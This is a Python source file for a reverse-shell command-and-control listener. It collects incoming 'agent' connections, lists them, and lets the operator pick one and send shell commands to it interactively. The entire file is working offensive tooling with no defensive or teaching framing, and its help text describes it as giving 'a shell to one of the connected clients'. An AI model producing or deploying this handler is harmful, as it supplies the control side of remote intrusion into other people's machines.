import socketserver
import sys
import threading
from socket import error as sock_error


# Servers address and port
LHOST, LPORT = '127.0.0.1', 8080


class TCPHandler(socketserver.BaseRequestHandler):
    # Begins prompt and starts the recvthread
    def handle(self):
        recvthread = threading.Thread(target=self.recv_message, args=())
        recvthread.start()
        while True:
            try:
                cmd = input()
                if len(cmd) > 0:
                    if "kill" in cmd:
                        self.request.send("1".encode("utf-8"))
                        print('close')
                        recvthread.join()
                        sys.exit()
                    else:
                        self.request.send(cmd.encode("utf-8"))
            except sock_error as e:
                print(e)
                continue

    # A thread that listens for data from the agent
    def recv_message(self):
        while True:
            try:
                data = str(self.request.recv(4096), 'utf-8')
                if data:
                    print("{0}".format(data))
                    if data == "\nClosing connection":
                        print("closed")
                        sys.exit()
            except Exception as e:
                print(e)
                TCPServer(LHOST, LPORT)


# Main class; starts the tcp server
class TCPServer:

    def __init__(self, LHOST, LPORT):
        self.stored_sockets = []
        self.LHOST = LHOST
        self.LPORT = LPORT
        self.server = socketserver.TCPServer((self.LHOST, self.LPORT), TCPHandler)
        self.check_connections_process = threading.Thread(target=(self.check_for_connections), args=(),
                                                          daemon=True).start()
        self.main()

    # Start TCPHandler instance as thread to receive agent shell
    def start_handler(self, conn, addr):
        self.server.finish_request(conn, addr)

    # Main prompt
    def main(self):
        command_list = ["help", "list", "connect"]
        print("Type help for a list of commands")
        while True:
            try:
                main_cmd = input("\n>")

                if main_cmd == "list":
                    for i in self.stored_sockets:
                        print(i)

                if main_cmd == 'connect':
                    print("{}\n".format(list(enumerate(self.stored_sockets))))
                    num = int(input("Which connection, choose from list: "))
                    addr, conn = self.stored_sockets[num][0], self.stored_sockets[num][1]
                    handler_thread = threading.Thread(target=(self.start_handler), args=(conn, addr))
                    handler_thread.start()
                    handler_thread.join()

                elif main_cmd == "help":
                    print(
                        "list: Shows a list of connected clients\nconnect: Gives a shell to one of the connected clients\n")

            except IndexError and TypeError and ValueError:
                continue

    # Checks for connections to server
    def check_for_connections(self):
        while True:
            sock_obj, addr = self.server.get_request()
            self.stored_sockets.append([addr, sock_obj])


TCPServer(LHOST, LPORT)
